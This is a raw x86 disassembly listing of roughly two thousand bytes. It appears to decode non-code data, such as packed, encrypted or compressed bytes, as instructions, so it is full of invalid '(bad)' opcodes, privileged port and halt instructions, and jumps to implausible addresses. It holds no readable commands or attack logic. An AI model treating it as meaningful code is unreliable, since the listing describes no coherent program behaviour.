  414ca7:	push   esi
  414ca8:	sbb    eax,0x7de295a3
  414cad:	out    0xd5,eax
  414caf:	lock mov ds:0x2f784f07,eax
  414cb5:	mov    ds:0xd9601577,eax
  414cba:	ror    BYTE PTR [edi],0xd4
  414cbd:	(bad)  
  414cbe:	mov    ds,WORD PTR [ebp-0x6a3beaa9]
  414cc4:	mov    ah,0x97
  414cc6:	push   es
  414cc7:	out    0xf1,eax
  414cc9:	(bad)  
  414ccb:	adc    al,0x2d
  414ccd:	stc    
  414cce:	sbb    eax,0x12245518
  414cd3:	xchg   cl,cl
  414cd5:	dec    ebx
  414cd6:	jle    0x414cad
  414cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd9:	inc    ebx
  414cda:	and    eax,0x2aaafe09
  414cdf:	mov    edx,0x9a7d5eaf
  414ce4:	adc    al,0x50
  414ce6:	add    DWORD PTR [ecx],0xffffffa8
  414ce9:	and    al,BYTE PTR [ebx-0x6329bb95]
  414cef:	or     bh,BYTE PTR [esi-0x7b]
  414cf2:	sbb    DWORD PTR [ebp+0x49],edx
  414cf5:	scas   al,BYTE PTR es:[edi]
  414cf6:	pop    edx
  414cf7:	jmp    0x414d2a
  414cf9:	and    dl,BYTE PTR [edx]
  414cfb:	mov    ch,0xd9
  414cfd:	fadd   QWORD PTR [edx-0x14b436e3]
  414d03:	inc    edi
  414d04:	mov    BYTE PTR [esi+0x43],ch
  414d07:	add    dh,dh
  414d09:	sub    eax,0xda1644c
  414d0e:	jbe    0x414d8d
  414d10:	sbb    BYTE PTR [edi],bl
  414d12:	fidiv  DWORD PTR [esi-0x54]
  414d15:	loopne 0x414d16
  414d17:	cmp    al,0xa3
  414d19:	hlt    
  414d1a:	gs gs aas 
  414d1d:	enter  0xb617,0x85
  414d21:	div    DWORD PTR ds:0x83d83905
  414d27:	push   es
  414d28:	loopne 0x414cd9
  414d2a:	cmp    BYTE PTR [ecx],dh
  414d2c:	xchg   edx,eax
  414d2d:	sbb    eax,0xcef9b633
  414d32:	mov    eax,ds:0x73b98405
  414d37:	jge    0x414d4a
  414d39:	lock mov ebp,0xaa11b22c
  414d3f:	stos   BYTE PTR es:[edi],al
  414d40:	jmp    0x414d44
  414d42:	daa    
  414d43:	jbe    0x414cf6
  414d45:	pop    eax
  414d46:	add    esp,DWORD PTR [eax]
  414d48:	sahf   
  414d49:	cmp    eax,0x38030511
  414d4e:	test   edi,eax
  414d50:	mov    ebp,DWORD PTR [esp+0x6d]
  414d54:	mov    gs:0xe2e3a0f2,eax
  414d5a:	mov    BYTE PTR [esi],al
  414d5c:	(bad)  
  414d5d:	gs push 0xf6e5762b
  414d63:	mov    gs,ebp
  414d65:	sbb    DWORD PTR [ebx],0xffffffec
  414d68:	lock outs dx,DWORD PTR ds:[esi]
  414d6a:	inc    eax
  414d6b:	xor    esi,DWORD PTR [eax-0x6]
  414d6e:	out    0x27,al
  414d70:	push   ebx
  414d71:	icebp  
  414d72:	sbb    al,0xc0
  414d74:	scas   eax,DWORD PTR es:[edi]
  414d75:	mov    cl,0x3
  414d77:	sub    DWORD PTR [eax],ebx
  414d79:	jne    0x414dd3
  414d7b:	sti    
  414d7c:	imul   ebp,DWORD PTR [eax],0xfffffff2
  414d7f:	or     bh,bl
  414d81:	and    BYTE PTR [ebp+0x1f4acc30],bl
  414d87:	inc    edx
  414d88:	sbb    DWORD PTR [esi],esp
  414d8a:	loop   0x414d81
  414d8c:	dec    DWORD PTR [edx+ecx*2+0x5b]
  414d90:	rcl    BYTE PTR [edi-0x3e02d5a3],1
  414d96:	pop    edx
  414d97:	call   0x18c0f71
  414d9c:	lea    ebx,[edx-0x38288e61]
  414da2:	ins    DWORD PTR es:[edi],dx
  414da3:	xchg   ebp,eax
  414da4:	mov    ebp,0x89556124
  414da9:	cmp    al,0x5d
  414dab:	push   cs
  414dac:	in     al,dx
  414dad:	hlt    
  414dae:	retf   
  414daf:	aam    0x8c
  414db1:	xchg   esi,eax
  414db2:	outs   dx,DWORD PTR ds:[esi]
  414db3:	add    BYTE PTR [edx],bl
  414db5:	and    al,0xa
  414db7:	inc    esp
  414db8:	aam    0xe9
  414dba:	push   ecx
  414dbb:	add    al,bh
  414dbd:	or     edx,DWORD PTR [ecx+0x57]
  414dc0:	push   es
  414dc1:	cld    
  414dc2:	aad    0xc9
  414dc4:	aam    0xb5
  414dc6:	jp     0x414d92
  414dc8:	ret    
  414dc9:	jae    0x414d5f
  414dcb:	test   DWORD PTR [edx+edx*2+0x8],0xfb2eb5fe
  414dd3:	call   0xce574567
  414dd8:	stc    
  414dd9:	pop    ds
  414dda:	jp     0x414d86
  414ddc:	mov    edx,0x74fb2dcc
  414de1:	mov    ebp,0x9ce1bfe5
  414de6:	sub    eax,DWORD PTR [ecx+0x2]
  414de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dea:	mov    ch,0xde
  414dec:	iret   
  414ded:	push   ebx
  414dee:	xchg   ebx,eax
  414def:	cwde   
  414df0:	out    0xf5,eax
  414df2:	or     edx,eax
  414df4:	adc    esp,eax
  414df6:	aas    
  414df7:	jmp    0x414e67
  414df9:	xchg   DWORD PTR [edx+0x6a9531bd],ecx
  414dff:	mov    dh,0x23
  414e01:	xchg   esp,eax
  414e02:	mul    edx
  414e04:	ret    0xac21
  414e07:	test   DWORD PTR [esi+0x6ea0cedc],ebx
  414e0d:	call   0x2f16:0x5524cb35
  414e14:	inc    ebx
  414e15:	aad    0x30
  414e17:	adc    bh,0xf3
  414e1a:	sbb    al,ch
  414e1c:	pop    eax
  414e1d:	test   eax,0x3e76cfa2
  414e22:	and    al,0xd9
  414e24:	cmp    al,BYTE PTR [edi]
  414e26:	div    bh
  414e28:	pop    eax
  414e29:	stos   DWORD PTR es:[edi],eax
  414e2a:	and    cl,ch
  414e2c:	lea    eax,[edi]
  414e2e:	ret    
  414e2f:	xchg   esp,eax
  414e30:	cmp    eax,DWORD PTR [edx]
  414e32:	xlat   BYTE PTR ds:[ebx]
  414e33:	push   ebp
  414e34:	out    dx,eax
  414e35:	sbb    al,dh
  414e37:	ds or  eax,0xfe1e31e4
  414e3d:	ret    
  414e3e:	call   0x5cdf9027
  414e43:	adc    eax,0x935b75f8
  414e48:	push   edx
  414e49:	mov    edi,0x4edafd41
  414e4e:	pushf  
  414e4f:	cmp    dh,BYTE PTR [ecx+0x32e6b34e]
  414e55:	xchg   DWORD PTR [eax-0x2b],edi
  414e58:	inc    ecx
  414e59:	outs   dx,BYTE PTR ds:[esi]
  414e5a:	lahf   
  414e5b:	push   0xe669393c
  414e60:	push   ebp
  414e61:	and    BYTE PTR ds:0x1b8ae50,bh
  414e67:	sbb    DWORD PTR [eax+0x15],eax
  414e6a:	cli    
  414e6b:	stos   BYTE PTR es:[edi],al
  414e6c:	ret    
  414e6d:	xchg   DWORD PTR [eax],eax
  414e6f:	add    al,0x7f
  414e71:	pop    ebp
  414e72:	stos   BYTE PTR es:[edi],al
  414e73:	sub    BYTE PTR [ecx],cl
  414e75:	imul   eax,ebp,0x64
  414e78:	fisttp QWORD PTR [edi-0x56]
  414e7b:	dec    edx
  414e7c:	push   edx
  414e7d:	jne    0x414eb6
  414e7f:	push   es
  414e80:	cwde   
  414e81:	jmp    0x414e42
  414e83:	in     eax,dx
  414e84:	push   cs
  414e85:	je     0x414e32
  414e87:	rcr    DWORD PTR [ebp+0x6c],cl
  414e8a:	sbb    DWORD PTR [edx+ebx*8+0x384d6f34],ebx
  414e91:	push   esp
  414e92:	imul   ebp,DWORD PTR [ebx+ebx*2+0x66],0x3f
  414e97:	xchg   ecx,eax
  414e98:	fwait
  414e99:	fwait
  414e9a:	(bad)  
  414e9b:	mov    WORD PTR [edi-0x60],ds
  414e9e:	lds    esp,FWORD PTR [ebp+0x4]
  414ea1:	adc    BYTE PTR [eax+0x3cc07421],ch
  414ea7:	jae    0x414e54
  414ea9:	hlt    
  414eaa:	dec    esi
  414eab:	dec    esi
  414eac:	pop    es
  414ead:	out    0x88,al
  414eaf:	mov    ch,BYTE PTR [edx]
  414eb1:	or     eax,0x6453fb32
  414eb6:	popf   
  414eb7:	jg     0x414ed2
  414eb9:	and    ecx,esp
  414ebb:	cmp    BYTE PTR [edx],bh
  414ebd:	test   BYTE PTR [edx],0xc0
  414ec0:	mov    ds:0xd1551e55,eax
  414ec5:	mov    eax,0xed3fffc8
  414eca:	imul   esp,ebx,0x41
  414ecd:	sbb    DWORD PTR [edx],edi
  414ecf:	ret    0x7bf
  414ed2:	iret   
  414ed3:	(bad)  
  414ed4:	jp     0x414efd
  414ed6:	push   ecx
  414ed7:	sub    al,0xe8
  414ed9:	pop    es
  414eda:	pop    ebx
  414edb:	(bad)  
  414edc:	sbb    bl,BYTE PTR [esi-0x75]
  414edf:	jbe    0x414f18
  414ee1:	mov    eax,0xcabc35a5
  414ee6:	or     BYTE PTR ds:0x3d737f39,bh
  414eec:	push   0xffffffee
  414eee:	xor    BYTE PTR [ebp-0x45fc3272],cl
  414ef4:	ins    DWORD PTR es:[edi],dx
  414ef5:	pop    esp
  414ef6:	cmp    cl,bl
  414ef8:	jmp    0x4b028638
  414efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efe:	push   ecx
  414eff:	sbb    esi,DWORD PTR [edi]
  414f01:	inc    edi
  414f02:	push   0xed5bab97
  414f07:	neg    DWORD PTR [ebx-0x65404a13]
  414f0d:	mov    WORD PTR [edi+esi*4-0x5cd9235e],ss
  414f14:	cmp    eax,0x69d933d2
  414f19:	ins    BYTE PTR es:[edi],dx
  414f1a:	dec    edx
  414f1b:	cmp    bl,cl
  414f1d:	jp     0x414ed6
  414f1f:	bound  edi,QWORD PTR [eax+0x4e183fde]
  414f25:	jl     0x414f93
  414f27:	test   al,0x40
  414f29:	cmp    bh,BYTE PTR [ebx-0x719b18ba]
  414f2f:	loop   0x414f9f
  414f31:	jns    0x414ed3
  414f33:	loop   0x414f17
  414f35:	or     eax,0x8fc7d364
  414f3a:	sbb    al,0x20
  414f3c:	mov    edi,0xef06b1df
  414f41:	and    dl,0x32
  414f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f45:	jne    0x414f32
  414f47:	aam    0xc1
  414f49:	xor    BYTE PTR [ebx-0xa2739ee],bl
  414f4f:	scas   eax,DWORD PTR es:[edi]
  414f50:	adc    DWORD PTR [ebx],esp
  414f52:	out    0xf9,al
  414f54:	pop    ss
  414f55:	imul   ecx,eax,0xffffffe1
  414f58:	push   edx
  414f59:	dec    eax
  414f5a:	xor    cl,BYTE PTR [esi+0x3e]
  414f5d:	sub    al,0xfb
  414f5f:	retf   
  414f60:	mov    al,ds:0x48dda188
  414f65:	pusha  
  414f66:	mov    ds:0xc564d26b,al
  414f6b:	dec    esi
  414f6c:	jb     0x414ef5
  414f6e:	dec    ebx
  414f6f:	add    eax,DWORD PTR [edi]
  414f71:	cmc    
  414f72:	mov    DWORD PTR [eax+0x6d],esp
  414f75:	push   ds
  414f76:	xor    esp,DWORD PTR [edi+0x1c]
  414f79:	xchg   edx,eax
  414f7a:	cwde   
  414f7b:	sbb    eax,0xaba03e0a
  414f80:	in     al,0x4a
  414f82:	jle    0x414fed
  414f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f85:	add    al,0x13
  414f87:	fmul   st,st(6)
  414f89:	test   eax,0x4aedc8cf
  414f8e:	std    
  414f8f:	inc    eax
  414f90:	add    BYTE PTR [esi],bl
  414f92:	lods   eax,DWORD PTR ds:[esi]
  414f93:	das    
  414f94:	push   ecx
  414f95:	daa    
  414f96:	in     eax,dx
  414f97:	fldenv [ebx-0x45]
  414f9a:	shl    ecx,1
  414f9c:	push   cs
  414f9d:	enter  0xba10,0x1e
  414fa1:	repz shl DWORD PTR [bx+0x7c],0xe
  414fa7:	lods   eax,DWORD PTR ds:[esi]
  414fa8:	fistp  DWORD PTR [ebx+edx*1]
  414fab:	dec    esi
  414fac:	mov    bh,0x15
  414fae:	gs ja  0x414f5b
  414fb1:	inc    edx
  414fb2:	mov    ds:0xd61cd3d0,al
  414fb7:	sub    eax,0xb47b9340
  414fbc:	lods   eax,DWORD PTR ds:[esi]
  414fbd:	jle    0x414f5e
  414fbf:	pop    ebp
  414fc0:	cdq    
  414fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc2:	jb     0x414fd9
  414fc4:	mov    bl,0x43
  414fc6:	cmc    
  414fc7:	scas   eax,DWORD PTR es:[edi]
  414fc8:	or     eax,0x73e529e
  414fcd:	adc    eax,0xcb968d56
  414fd2:	xchg   ecx,eax
  414fd3:	pop    eax
  414fd4:	pushf  
  414fd5:	rol    DWORD PTR [edi-0x7c19a40f],cl
  414fdb:	add    edx,DWORD PTR [eax]
  414fdd:	les    edi,FWORD PTR [ebp+0x4e]
  414fe0:	stos   BYTE PTR es:[edi],al
  414fe1:	call   0x1a57:0x5ce41af
  414fe8:	cmp    edi,DWORD PTR [ebp+0x1c]
  414feb:	sahf   
  414fec:	and    al,0x3b
  414fee:	retf   
  414fef:	loopne 0x41500e
  414ff1:	xor    al,0x24
  414ff3:	mov    ch,0xd
  414ff5:	mov    ecx,0xab924556
  414ffa:	xor    DWORD PTR [edx+0x1a],ecx
  414ffd:	and    al,dl
  414fff:	fs inc eax
  415001:	push   ss
  415002:	inc    ebx
  415003:	jmp    0x33c5bcae
  415008:	popf   
  415009:	aas    
  41500a:	jne    0x41504e
  41500c:	xchg   edi,eax
  41500d:	stos   DWORD PTR es:[edi],eax
  41500e:	xchg   DWORD PTR [esp+edi*4],esp
  415011:	popa   
  415012:	outs   dx,BYTE PTR ds:[esi]
  415013:	push   esp
  415014:	mov    dl,0x1e
  415016:	mov    dl,0xb9
  415018:	sbb    BYTE PTR [ebp-0x55],cl
  41501b:	fldenv [ecx]
  41501d:	push   esi
  41501e:	inc    edx
  41501f:	cmp    esi,DWORD PTR [ecx-0x1bc9a7f7]
  415025:	mov    dh,0x60
  415027:	mov    bh,BYTE PTR gs:[eax]
  41502a:	(bad)  
  41502b:	xchg   DWORD PTR [ecx+0x24],ecx
  41502e:	and    dl,bh
  415030:	xor    ecx,esi
  415032:	mov    ds:0x6fa6bd75,eax
  415037:	pusha  
  415038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415039:	neg    BYTE PTR [edx]
  41503b:	loope  0x415003
  41503d:	mov    al,0x9d
  41503f:	test   al,0x67
  415041:	fcmovu st,st(0)
  415043:	into   
  415044:	repnz loopne 0x415067
  415047:	or     ebx,DWORD PTR [edx+edx*2-0x1ad12c30]
  41504e:	not    bl
  415050:	es in  al,0x0
  415053:	gs jecxz 0x41503a
  415056:	sti    
  415057:	cwde   
  415058:	xor    BYTE PTR [edx],dh
  41505a:	sbb    eax,0xd335a2ae
  41505f:	mov    al,ah
  415061:	(bad)  
  415062:	jne    0x415088
  415064:	ss jg  0x414ffb
  415067:	pop    esi
  415068:	sar    cl,1
  41506a:	ins    BYTE PTR es:[edi],dx
  41506b:	or     BYTE PTR [edx+0x48],ah
  41506e:	(bad)  
  41506f:	xchg   edi,eax
  415070:	ret    0xdb1b
  415073:	inc    edx
  415074:	inc    edx
  415075:	push   0xffffff9f
  415077:	loope  0x4150de
  415079:	inc    ebx
  41507a:	push   ebx
  41507b:	pop    eax
  41507d:	mov    al,ds:0xbd9c2561
  415082:	mov    dl,0x5e
  415084:	inc    edi
  415085:	into   
  415086:	and    ah,BYTE PTR [ecx]
  415088:	popa   
  415089:	scas   eax,DWORD PTR es:[edi]
  41508a:	repnz sbb bl,BYTE PTR [ebx+0xc]
  41508e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41508f:	addr16 dec esi
  415091:	add    al,0xeb
  415093:	mov    eax,DWORD PTR [esi]
  415095:	stc    
  415096:	in     eax,dx
  415097:	call   0x920ad41d
  41509c:	into   
  41509d:	ret    0x44da
  4150a0:	xchg   DWORD PTR [ebp-0x5e],edx
  4150a3:	pop    ds
  4150a4:	in     al,0xd7
  4150a6:	lock aam 0x87
  4150a9:	adc    al,0x6
  4150ab:	sbb    eax,0xf9934194
  4150b0:	cmp    BYTE PTR [edi+eiz*2+0x71],cl
  4150b4:	(bad)  
  4150b5:	xlat   BYTE PTR ds:[ebx]
  4150b6:	push   ecx
  4150b7:	add    eax,0x7a2a193c
  4150bc:	out    dx,eax
  4150bd:	sub    esi,DWORD PTR ds:0xf169c83b
  4150c3:	shl    DWORD PTR [edx-0x7f1c5ad5],cl
  4150c9:	and    eax,0xde2701d1
  4150ce:	pushf  
  4150cf:	sub    al,0x3
  4150d1:	frstor gs:[edi-0x2e]
  4150d5:	push   0xedb67a90
  4150da:	lds    eax,FWORD PTR [edx+ecx*8-0x19e2eb88]
  4150e1:	ror    DWORD PTR [eax+0x18449d17],cl
  4150e7:	retf   0x6eea
  4150ea:	push   0x4b18183f
  4150ef:	mov    ebp,0x5b34a8a7
  4150f4:	aaa    
  4150f5:	addr16 retf 
  4150f7:	icebp  
  4150f8:	or     al,0xba
  4150fa:	mov    edx,0x86f6cf7c
  4150ff:	xlat   BYTE PTR ds:[ebx]
  415100:	sub    ah,BYTE PTR [edi-0x3003f9b2]
  415106:	or     ecx,esi
  415108:	or     dl,cl
  41510a:	fist   DWORD PTR [esi+eiz*8]
  41510d:	(bad)  
  41510e:	cmc    
  41510f:	xor    eax,0xf3ae8a95
  415114:	repz add BYTE PTR [ebx+0x574379b3],ch
  41511b:	pusha  
  41511c:	stc    
  41511d:	lock pop edx
  41511f:	retf   0xb2fc
  415122:	daa    
  415123:	mov    ds:0xdccc545a,al
  415128:	fwait
  415129:	sbb    eax,0x8f605711
  41512e:	test   eax,0xa854bcfb
  415133:	add    BYTE PTR [ebx+eax*1-0x71],0x6b
  415138:	mov    edi,0x87a83ad0
  41513d:	sub    bl,dh
  41513f:	cmp    BYTE PTR [edi+0x59d16504],ah
  415145:	mov    bl,BYTE PTR [eax-0x61]
  415148:	aaa    
  415149:	inc    eax
  41514a:	xchg   BYTE PTR [ebp+eiz*2+0xe],bh
  41514e:	adc    DWORD PTR [eax],edx
  415150:	xor    eax,0x27a841c6
  415155:	stos   DWORD PTR es:[edi],eax
  415156:	pop    ebx
  415157:	add    esp,DWORD PTR [ebx]
  415159:	pop    ecx
  41515a:	push   edx
  41515b:	out    dx,eax
  41515c:	lds    edx,FWORD PTR [eax-0x32786164]
  415162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415163:	test   al,0x5d
  415165:	pop    ecx
  415166:	sub    eax,0x17feb676
  41516b:	xchg   BYTE PTR ds:0x8456d783,ch
  415171:	mov    ds:0x6f5b2077,al
  415176:	test   eax,0xe0a4678c
  41517b:	push   ebx
  41517c:	dec    esp
  41517d:	fnstenv [edi]
  41517f:	adc    DWORD PTR [esi],0xc1b766d3
  415185:	test   ebx,0xf033b093
  41518b:	push   cs
  41518c:	jmp    0x4151b3
  41518e:	mov    ah,ch
  415190:	ins    DWORD PTR es:[edi],dx
  415191:	scas   al,BYTE PTR es:[edi]
  415192:	outs   dx,BYTE PTR ds:[esi]
  415193:	mov    ecx,edi
  415195:	xchg   bh,ch
  415197:	xchg   DWORD PTR [edx-0x192ea05c],edi
  41519d:	aaa    
  41519e:	jns    0x41514a
  4151a0:	dec    esi
  4151a1:	imul   eax,eax,0x31
  4151a4:	popa   
  4151a5:	mov    WORD PTR [ebx-0x209fe8dd],ds
  4151ab:	cwde   
  4151ac:	adc    bh,0x4
  4151af:	loop   0x4151c5
  4151b1:	ret    0x4c07
  4151b4:	add    BYTE PTR [ebp+0x57],dh
  4151b7:	add    al,0x2d
  4151b9:	push   eax
  4151ba:	jne    0x4151ea
  4151bc:	add    al,0x2e
  4151be:	xchg   ebp,eax
  4151bf:	imul   edi,DWORD PTR [edi-0x1de558c3],0xffffffab
  4151c6:	sbb    edx,eax
  4151c8:	mov    esp,0x86ed7c3d
  4151cd:	clc    
  4151ce:	push   cs
  4151cf:	mov    al,ds:0x1aaf7ab9
  4151d4:	arpl   bp,sp
  4151d6:	fsubr  QWORD PTR [edx-0x4d]
  4151d9:	jmp    0x3fc33725
  4151de:	push   esi
  4151df:	and    DWORD PTR [ecx+0x35],eax
  4151e2:	fisubr DWORD PTR ds:0xf1ade728
  4151e8:	jb     0x41523d
  4151ea:	mov    al,ds:0x1bccd31d
  4151ef:	or     BYTE PTR [eax+0x43],0x49
  4151f3:	mov    ebp,0x8a70b727
  4151f8:	xchg   ecx,eax
  4151f9:	stos   BYTE PTR es:[edi],al
  4151fa:	jg     0x415269
  4151fc:	call   0xc45c9d52
  415201:	or     al,0xd5
  415203:	pop    ss
  415204:	pop    es
  415205:	(bad)  
  415206:	test   eax,0xf8ecad45
  41520b:	(bad)  
  41520c:	fcomp  QWORD PTR [esp+eiz*2-0x702af9f]
  415213:	mov    esp,0xb158467a
  415218:	mov    bl,0x7d
  41521a:	mov    eax,ds:0x8e3bca38
  41521f:	sub    BYTE PTR [ebx+ebx*8],0x6f
  415223:	je     0x4151c9
  415225:	clc    
  415226:	out    0xa4,eax
  415228:	mul    DWORD PTR [edi+0x76]
  41522b:	pusha  
  41522c:	dec    ecx
  41522d:	rcr    DWORD PTR [edx],0xec
  415230:	dec    edx
  415231:	sar    BYTE PTR [esi-0x249a646c],0x28
  415238:	js     0x41526e
  41523a:	or     esp,esi
  41523c:	nop
  41523d:	lods   al,BYTE PTR ds:[esi]
  41523e:	ret    
  41523f:	mov    ebx,ebx
  415241:	xchg   ebx,eax
  415242:	jbe    0x4151dd
  415244:	xchg   ebx,eax
  415245:	pop    esi
  415246:	enter  0x34a2,0x1a
  41524a:	mov    ss,WORD PTR [ecx+0x1ef84712]
  415250:	mov    ds:0x4e5f0c71,al
  415255:	out    0xb9,eax
  415257:	retf   0xeb5c
  41525a:	test   BYTE PTR [esi-0x6d6df9ac],0xf5
  415261:	cmovbe edi,DWORD PTR [ecx+0x5c1169e0]
  415268:	xchg   ebp,eax
  415269:	adc    al,0x91
  41526b:	xchg   esi,eax
  41526c:	dec    esp
  41526d:	cmp    esp,DWORD PTR [edi+0x4fe468a]
  415273:	and    eax,0x1c2f8817
  415278:	je     0x4152dd
  41527a:	pop    eax
  41527b:	gs push 0xdc84c120
  415281:	in     al,0x5c
  415283:	cmp    BYTE PTR [ebx+eax*8],0x51
  415287:	in     eax,0xce
  415289:	iret   
  41528a:	out    0xcc,eax
  41528c:	push   ss
  41528d:	sbb    cl,cl
  41528f:	dec    eax
  415290:	or     ecx,DWORD PTR [edx+0x31]
  415293:	jns    0x4152f7
  415295:	pop    ebx
  415296:	or     esi,ecx
  415298:	mov    esi,0x1d165607
  41529d:	pop    edi
  41529e:	pop    edi
  41529f:	dec    ecx
  4152a0:	mov    dh,0xaf
  4152a2:	mov    esi,0x94336513
  4152a7:	jp     0x4152fc
  4152a9:	in     al,dx
  4152aa:	sbb    eax,0xaaf808b8
  4152af:	inc    edx
  4152b0:	push   ebp
  4152b1:	mov    al,ds:0xf58a4b12
  4152b6:	neg    esp
  4152b8:	rcl    ecx,1
  4152ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152bb:	mov    ds:0xaab429eb,eax
  4152c0:	loope  0x41524b
  4152c2:	aaa    
  4152c3:	and    DWORD PTR [ecx+0x358ae18f],ecx
  4152c9:	cmc    
  4152ca:	pop    es
  4152cb:	iret   
  4152cc:	mov    esi,0xa6f255af
  4152d1:	or     BYTE PTR [edi+0xb],ch
  4152d4:	pop    esi
  4152d5:	or     DWORD PTR [eax+ebx*4],esp
  4152d8:	mov    eax,DWORD PTR [ebx+0x7c]
  4152db:	mov    DWORD PTR [di],0x9e28a07f
  4152e2:	mov    ds:0x8f323c0a,al
  4152e7:	mov    edi,0x9e0928ea
  4152ec:	xor    eax,0x13afdb49
  4152f1:	push   0xffffffa1
  4152f3:	push   cs
  4152f4:	adc    edi,ecx
  4152f6:	out    0xdc,eax
  4152f8:	pop    esi
  4152f9:	adc    BYTE PTR [edi-0x34],cl
  4152fc:	jl     0x4152de
  4152fe:	mov    ds:0xb4b1a9a4,eax
  415303:	rol    BYTE PTR [edi],0x95
  415306:	cdq    
  415307:	test   BYTE PTR [ebx+0x23],al
  41530a:	mov    al,0xae
  41530c:	dec    eax
  41530d:	loop   0x4152be
  41530f:	sar    DWORD PTR [ebp+0x1c],1
  415312:	sub    esp,ebx
  415314:	mov    DWORD PTR [ebx-0x4f],ebp
  415317:	xor    DWORD PTR [edi+0x44],ecx
  41531a:	enter  0xbd4f,0x26
  41531e:	xlat   BYTE PTR ds:[ebx]
  41531f:	fdivr  QWORD PTR [ecx-0x58ba6ea9]
  415325:	add    BYTE PTR [esi],dl
  415327:	lahf   
  415328:	aaa    
  415329:	or     eax,0x60df8ecc
  41532e:	push   DWORD PTR [edi]
  415330:	inc    ecx
  415331:	add    ebp,DWORD PTR [ecx+0x5a]
  415334:	popa   
  415335:	aam    0x3
  415337:	sbb    DWORD PTR [eax-0x2c],0xffffffeb
  41533b:	mov    al,0x30
  41533d:	fwait
  41533e:	scas   eax,DWORD PTR es:[edi]
  41533f:	adc    eax,DWORD PTR [ebx]
  415341:	mov    ah,0xbc
  415343:	loopne 0x4153a1
  415345:	mov    edx,0xa5c9aee3
  41534a:	aad    0x8d
  41534c:	jne    0x41538e
  41534e:	in     al,0x8
  415350:	mov    WORD PTR [edx+0x1d],gs
  415353:	jne    0x41530a
  415355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415356:	rcr    BYTE PTR [ebp+0x2b],cl
  415359:	sbb    DWORD PTR [ebp-0x5101a329],ebx
  41535f:	xchg   edi,eax
  415360:	test   BYTE PTR [eax],0xe8
  415363:	jo     0x415391
  415365:	push   cs
  415366:	(bad)  
  415367:	mov    esi,0xf30a3dfd
  41536c:	adc    cl,bl
  41536e:	jmp    0x6d8:0x7aa5a57c
  415375:	pop    eax
  415376:	aas    
  415377:	stc    
  415378:	nop
  415379:	sbb    cl,BYTE PTR [ebp*1-0x19b09e8d]
  415380:	cmp    cl,BYTE PTR [esi+0x6613bfbe]
  415386:	mov    ebx,0x2aeda908
  41538b:	nop
  41538c:	xchg   edx,eax
  41538d:	inc    ebp
  41538e:	test   al,0x49
  415390:	jle    0x415404
  415392:	and    eax,eax
  415394:	fisub  DWORD PTR [ebp-0x30]
  415397:	out    dx,eax
  415398:	(bad)  
  41539a:	bnd jb 0x415352
  41539d:	fninit 
  41539f:	cs popa 
  4153a1:	call   0x979e0dd1
  4153a6:	out    dx,eax
  4153a7:	fs arpl bx,ax
  4153aa:	neg    BYTE PTR [eax+0x8]
  4153ad:	push   ss
  4153ae:	pop    esp
  4153af:	push   0x1e105689
  4153b4:	daa    
  4153b5:	mov    di,0xabdb
  4153b9:	pop    esp
  4153ba:	stc    
  4153bb:	jae    0x415373
  4153bd:	out    0x4d,eax
  4153bf:	dec    eax
  4153c0:	xchg   ecx,eax
  4153c1:	cmp    eax,0xf2157688
  4153c6:	call   0x3d486abd
  4153cb:	dec    esp
  4153cc:	xchg   edx,eax
  4153cd:	add    bl,0x28
  4153d0:	push   ss
  4153d1:	xchg   esp,eax
  4153d2:	setnp  BYTE PTR [ebx+0x6ce830ee]
  4153d9:	pop    DWORD PTR [esi+0x69]
  4153dc:	sbb    al,dh
  4153de:	mov    ds:0xe23dd24b,eax
  4153e3:	jb     0x415437
  4153e5:	pushf  
  4153e6:	or     bh,BYTE PTR [edx-0x3a]
  4153e9:	(bad)  
  4153ea:	js     0x4153d7
  4153ec:	xlat   BYTE PTR cs:[ebx]
  4153ee:	dec    esp
  4153ef:	xor    BYTE PTR [edx+esi*8],bl
  4153f2:	das    
  4153f3:	add    eax,0xf19c5860
  4153f8:	lods   eax,DWORD PTR ds:[esi]
  4153f9:	sub    al,0x94
  4153fb:	sti    
  4153fc:	jmp    FWORD PTR [ecx+eiz*1+0x5e6f63c7]
  415403:	sbb    al,0x4
  415405:	pop    ds
  415406:	inc    edi
  415407:	sbb    DWORD PTR [esi+0x38],ebp
  41540a:	lds    esp,FWORD PTR [ecx+0x3]
  41540d:	dec    esi
  41540e:	cmp    edx,0x811bd847
  415414:	inc    ebx
  415415:	sub    dl,ch
  415417:	dec    esi
  415418:	mov    eax,0x4e726199
  41541d:	lea    esp,[eax]
  41541f:	jbe    0x4153c1
  415421:	cmp    DWORD PTR [edx-0x2e],edx
  415424:	ja     0x4153fb
  415426:	add    edi,ebp
  415428:	jg     0x4153f1
  41542a:	dec    ebx
  41542b:	ins    DWORD PTR es:[edi],dx
  41542c:	lds    edx,FWORD PTR [ecx]
  41542e:	into   
  41542f:	jp     0x4153e4
  415431:	popa   
  415432:	mov    ebp,0xd749dbc1
  415437:	jmp    0x4153c8
  415439:	add    DWORD PTR [ebp+edi*8+0x56c9d741],eax
  415440:	xor    ebx,0x71
  415443:	dec    esi
  415444:	fiadd  DWORD PTR ds:0xfb044158
  41544a:	and    al,0x29
  41544c:	and    ch,BYTE PTR [ebx]
  41544e:	jns    0x415492
  415450:	aas    
  415451:	clc    
  415452:	shl    DWORD PTR [eax+eax*1],1
  415455:	test   ebp,0x403462d5
  41545b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545c:	retf   0x13d2
  41545f:	jns    0x4154db
  415461:	xchg   esi,eax
  415462:	jb     0x4154c0
  415464:	(bad)  
  415465:	cld    
  415466:	mov    bh,0xd
  415468:	or     bl,ah
  41546a:	js     0x415469
  41546c:	das    
  41546d:	shl    BYTE PTR [esp+ebp*2+0x40898512],cl
  415474:	shl    BYTE PTR [edx],0xe3
  415477:	aaa    
  415478:	(bad)  
  41547a:	xor    DWORD PTR [edi+0x54],0x65
